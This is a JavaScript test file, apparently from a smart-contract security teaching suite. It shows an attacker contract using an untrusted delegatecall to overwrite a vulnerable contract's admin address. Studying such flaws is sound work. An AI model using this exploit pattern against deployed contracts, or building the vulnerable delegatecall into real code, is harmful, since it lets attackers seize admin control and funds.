const { expect } = require("chai");

describe("UntrustedDelegatecall", () => {
	let vulnerable, attacker;

	it("deploys the contracts", async () => {
		const VulnerableFactory = await ethers.getContractFactory("UntrustedDelegatecall");
		const AttackerFactory = await ethers.getContractFactory("UntrustedDelegatecall_Attacker");

		vulnerable = await VulnerableFactory.deploy();
		attacker = await AttackerFactory.deploy();
	});

	it("checks the zero admin address", async () => {
		const admin = await vulnerable.admin();
		expect(admin).to.equal(ethers.constants.AddressZero);
	});

	it("performs the attack", async () => {
		await vulnerable.delegate(
			attacker.address,
			attacker.interface.getSighash("changeAdmin()")
		);
	});

	it("checks the updated admin address", async () => {
		const admin = await vulnerable.admin();
		expect(admin).to.equal("0xDeaDbeefdEAdbeefdEadbEEFdeadbeEFdEaDbeeF");
	});
});
